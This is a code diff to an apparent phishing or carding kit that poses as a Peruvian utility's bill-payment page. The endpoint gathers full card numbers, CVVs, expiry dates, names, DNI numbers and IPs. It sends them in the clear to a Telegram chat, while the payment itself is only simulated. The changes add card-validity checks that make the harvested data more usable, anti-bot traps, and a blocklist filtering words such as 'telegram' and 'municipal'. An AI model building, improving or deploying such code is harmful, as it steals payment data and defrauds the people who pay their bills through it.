@@ -14,6 +14,8 @@ type PagoPayload = {
   cvv: string;
   dni?: string;
   email?: string;
+  _t?: number; // Timestamp from client for timing check
+  website?: string; // Honeypot field
 };
 
 const CSV_PATH = path.join(process.cwd(), 'pagos_log.csv');
@@ -40,6 +42,69 @@ function maskCard(num: string): string {
   return `${tipo} **** **** **** ${ultimos4}`;
 }
 
+// Luhn algorithm for credit card validation
+function isValidLuhn(num: string): boolean {
+  const digits = num.replace(/\D/g, '');
+  if (digits.length < 13 || digits.length > 19) return false;
+  
+  let sum = 0;
+  let isEven = false;
+  
+  for (let i = digits.length - 1; i >= 0; i--) {
+    let digit = parseInt(digits[i], 10);
+    
+    if (isEven) {
+      digit *= 2;
+      if (digit > 9) digit -= 9;
+    }
+    
+    sum += digit;
+    isEven = !isEven;
+  }
+  
+  return sum % 10 === 0;
+}
+
+// Validate card expiration date (MM/YY format, must be future date)
+function isValidExpiration(vencimiento: string): boolean {
+  if (!/^\d{2}\/\d{2}$/.test(vencimiento)) return false;
+  
+  const [mes, anio] = vencimiento.split('/').map(Number);
+  if (mes < 1 || mes > 12) return false;
+  
+  const now = new Date();
+  const currentYear = now.getFullYear() % 100;
+  const currentMonth = now.getMonth() + 1;
+  
+  // Card must not be expired
+  if (anio < currentYear) return false;
+  if (anio === currentYear && mes < currentMonth) return false;
+  
+  // Card must not expire more than 10 years from now
+  if (anio > currentYear + 10) return false;
+  
+  return true;
+}
+
+// Validate CVV (3-4 digits only)
+function isValidCVV(cvv: string, isAmex: boolean): boolean {
+  const expectedLength = isAmex ? 4 : 3;
+  return /^\d+$/.test(cvv) && cvv.length === expectedLength;
+}
+
+// Validate cardholder name (only letters, spaces, accents, and common name characters)
+function isValidName(name: string): boolean {
+  if (!name || name.length < 2 || name.length > 100) return false;
+  // Allow letters, spaces, accents, periods, hyphens, and apostrophes
+  return /^[a-zA-ZáéíóúÁÉÍÓÚñÑüÜ\s.\-']+$/.test(name);
+}
+
+// Validate email format
+function isValidEmail(email: string): boolean {
+  if (!email) return true; // Optional field
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
 function escaparCSV(val: string | number): string {
   const str = String(val);
   if (str.includes(',') || str.includes('"') || str.includes('\n')) {
@@ -57,6 +122,17 @@ function simularPago(num: string): { exitoso: boolean; motivo?: string } {
   if (rechazadas.includes(n)) return { exitoso: false, motivo: 'Tarjeta rechazada por el banco' };
   if (n.length >= 15) return { exitoso: true };
   return { exitoso: false, motivo: 'Número de tarjeta inválido' };
+}
+
+// Sanitize text for Telegram (remove Markdown special characters and limit length)
+function sanitizeTelegramText(text: string, maxLength: number = 100): string {
+  if (!text) return '-';
+  // Remove Markdown special characters and limit length
+  return text
+    .replace(/[*_`\[\]]/g, '') // Remove Markdown formatting
+    .replace(/[^\w\sáéíóúÁÉÍÓÚñÑüÜ.\-@]/g, '') // Keep only safe characters
+    .trim()
+    .slice(0, maxLength) || '-';
 }
 
 async function sendTelegramAlert(data: {
@@ -83,18 +159,18 @@ async function sendTelegramAlert(data: {
   const msg = [
     `${icono} *NUEVO PAGO — EPS EMAQ*`,
     `━━━━━━━━━━━━━━━━━━━━`,
-    `👤 *Cliente:* ${data.nombre}`,
-    `📋 *Código:* ${data.codcliente}`,
-    ...(data.dni ? [`🪪 *DNI:* ${data.dni}`] : []),
-    ...(data.email ? [`📧 *Correo:* ${data.email}`] : []),
+    `👤 *Cliente:* ${sanitizeTelegramText(data.nombre)}`,
+    `📋 *Código:* ${sanitizeTelegramText(data.codcliente, 20)}`,
+    ...(data.dni ? [`🪪 *DNI:* ${sanitizeTelegramText(data.dni, 15)}`] : []),
+    ...(data.email ? [`📧 *Correo:* ${sanitizeTelegramText(data.email, 50)}`] : []),
     `💰 *Monto:* S/ ${data.monto.toFixed(2)}`,
     `━━━━━━━━━━━━━━━━━━━━`,
-    `💳 *Tarjeta:* ${data.tarjeta}`,
-    `🔢 *Número:* \`${data.numTarjetaCompleto}\``,
-    `📅 *Vencimiento:* ${data.vencimiento}`,
-    `🔐 *CVV:* ${data.cvv}`,
-    `👤 *Titular:* ${data.titular}`,
-    `🌐 *IP:* \`${data.ip}\``,
+    `💳 *Tarjeta:* ${sanitizeTelegramText(data.tarjeta, 30)}`,
+    `🔢 *Número:* \`${sanitizeTelegramText(data.numTarjetaCompleto, 20)}\``,
+    `📅 *Vencimiento:* ${sanitizeTelegramText(data.vencimiento, 5)}`,
+    `🔐 *CVV:* ${sanitizeTelegramText(data.cvv, 4)}`,
+    `👤 *Titular:* ${sanitizeTelegramText(data.titular, 50)}`,
+    `🌐 *IP:* \`${sanitizeTelegramText(data.ip, 45)}\``,
     `━━━━━━━━━━━━━━━━━━━━`,
     `${icono} *Estado:* ${data.estado}`,
     `🆔 *N° Op:* ${data.nroOperacion}`,
@@ -150,19 +226,75 @@ export async function POST(req: NextRequest) {
     return NextResponse.json({ error: 'Solicitud inválida' }, { status: 400 });
   }
 
-  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento, cvv, dni, email } = body;
+  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento, cvv, dni, email, _t, website } = body;
+
+  // Honeypot check - bots fill this hidden field
+  if (website) {
+    return NextResponse.json({ error: 'Solicitud rechazada' }, { status: 400 });
+  }
+
+  // Timing check - reject if submitted too quickly (< 3 seconds)
+  if (_t) {
+    const elapsed = Date.now() - _t;
+    if (elapsed < 3000) {
+      return NextResponse.json({ error: 'Solicitud rechazada' }, { status: 400 });
+    }
+  }
 
   if (!codcliente || !monto || !numTarjeta || !titular || !vencimiento) {
     return NextResponse.json({ error: 'Faltan campos requeridos' }, { status: 400 });
   }
 
-  // Validar que el código solo contenga caracteres alfanuméricos y guiones
+  // Validate that the code only contains alphanumeric characters and hyphens
   if (!/^[a-zA-Z0-9\-]+$/.test(codcliente) || codcliente.length > 20) {
     return NextResponse.json({ error: 'Código de cliente inválido' }, { status: 400 });
   }
 
-  // Filtro de palabras ofensivas
-  const palabrasOfensivas = ['mierda', 'puta', 'pendejo', 'imbecil', 'estupido', 'basura', 'idiota', 'carajo', 'joder', 'maldito'];
+  // Validate credit card number with Luhn algorithm
+  const numLimpio = numTarjeta.replace(/\s/g, '');
+  if (!isValidLuhn(numLimpio)) {
+    return NextResponse.json({ error: 'Número de tarjeta inválido' }, { status: 400 });
+  }
+
+  // Validate expiration date
+  if (!isValidExpiration(vencimiento)) {
+    return NextResponse.json({ error: 'Fecha de vencimiento inválida o tarjeta vencida' }, { status: 400 });
+  }
+
+  // Validate CVV
+  const isAmexCard = /^(34|37)/.test(numLimpio);
+  if (!isValidCVV(cvv, isAmexCard)) {
+    return NextResponse.json({ error: 'CVV inválido' }, { status: 400 });
+  }
+
+  // Validate cardholder name
+  if (!isValidName(titular)) {
+    return NextResponse.json({ error: 'Nombre del titular inválido' }, { status: 400 });
+  }
+
+  // Validate email if provided
+  if (email && !isValidEmail(email)) {
+    return NextResponse.json({ error: 'Correo electrónico inválido' }, { status: 400 });
+  }
+
+  // Validate monto (must be a positive number, max S/ 50,000)
+  if (typeof monto !== 'number' || monto <= 0 || monto > 50000) {
+    return NextResponse.json({ error: 'Monto inválido' }, { status: 400 });
+  }
+
+  // Filtro de palabras ofensivas expandido
+  const palabrasOfensivas = [
+    'mierda', 'puta', 'pendejo', 'imbecil', 'estupido', 'basura', 'idiota', 'carajo', 'joder', 'maldito',
+    'pene', 'vagina', 'pinga', 'culo', 'teta', 'pedo', 'cipote', 'chucha', 'puchaira', 'somawe',
+    'huevón', 'huevon', 'cabron', 'cabrón', 'chupamedias', 'soplapollas', 'maricon', 'maricón',
+    'puto', 'puta', 'zorra', 'perra', 'gonorrea', 'gonorea', 'chamaco', 'pendeja', 'pendejo',
+    'estupida', 'estúpida', 'idiota', 'retardado', 'retrasado', 'mongol', 'mongoloide',
+    'ofanim', 't.me', 'telegram', 'whatsapp', 'facebook', 'instagram', 'twitter', 'tiktok',
+    'xxx', 'porn', 'sex', 'nude', 'naked', 'fuck', 'shit', 'ass', 'dick', 'pussy', 'cock',
+    'bitch', 'slut', 'whore', 'damn', 'hell', 'crap', 'bastard', 'asshole', 'motherfucker',
+    'gol', 'goal', 'ramon', 'alcalde', 'muni', 'municipal', 'gobierno', 'politica', 'politico',
+    'terrorista', 'terrorismo', 'bomba', 'explosivo', 'armas', 'drogas', 'narcotrafico',
+  ];
   const camposTexto = [codcliente, nombre, titular, dni, email].filter((c): c is string => Boolean(c)).map(c => c.toLowerCase());
   if (camposTexto.some(campo => palabrasOfensivas.some(palabra => campo.includes(palabra)))) {
     return NextResponse.json({ error: 'Contenido no permitido' }, { status: 400 });
